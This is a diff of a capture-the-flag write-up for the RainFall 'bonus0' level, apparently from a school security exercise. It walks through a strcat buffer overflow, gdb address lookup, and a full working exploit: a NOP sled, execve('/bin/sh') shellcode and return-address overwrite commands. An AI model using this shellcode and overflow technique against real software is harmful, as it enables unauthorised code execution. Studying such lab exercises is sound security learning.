@@ -86,8 +86,7 @@ by checking the output, the two buffers are stored next to each other. The strnc
 
 And as the buffer is next to each other, `strcat()` function will consider the second string as the part of the first string, since there is no `'\0'` is located in the first part of the buffer.
 
-XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-
+Since we know the input will be stored next to each other, as we have been doing past subjects, we need to provide a payload that returns to the address where `shellcode` is stored.
 
 Now we build the payload.
 
@@ -101,6 +100,11 @@ NOP * 100 + [shellcode]
 then find the `buffer` address for beginning of buffer address + 61 and end of the NOP instruction
 
 ```
+gdb-peda$ b *p
+gdb-peda$ run
+[...]
+gdb-peda$ ni
+[....]
 [----------------------------------registers-----------------------------------]
 EAX: 0x4
 EBX: 0xb7fd0ff4 --> 0x1a4d7c
@@ -133,25 +137,26 @@ EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflo
 [------------------------------------------------------------------------------]
 ```
 
+*** THE ADDRESS WILL CHANGE, AND WE WANT TO FIND THE ESP TO DETERMINE WHERE WE SHOULD FEED THE PAYLOAD THAT OVERWRITES***
+
 ```
-Choose an address between 0xbfffe640 + 61 (0xbfffe67d) and 0xbfffe640 + 100 (0xbfffe6a4) => 0xbfffe640 (\xd0\xe6\xff\xbf)
+Choose an address between 0xbfffe630 + 61 (0xbfffe66d) and 0xbfffe630 + 100 (0xbfffe694) => 0xbfffe694 (\x94\xe6\xff\xbf)
 ```
 
 the exploit will be following
 
 ```
+# first argument
 python -c 'print "\x90" * 100 + "x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
-```
-```
-python -c 'print "A" * 9 + "\x86\xe6\xff\xbf" + "B" * 7'
+# second argument
+python -c 'print "A" * 9 + "\x94\xe6\xff\xbf" + "B" * 7'
+
+# payload
+(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\x94\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
 ```
 
 ```
-(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\x86\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
-```
-
-```
-bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\x86\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\x94\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
  -
  -
 ��������������������AAAAAAAAA����BBBBBBB�� AAAAAAAAA����BBBBBBB��
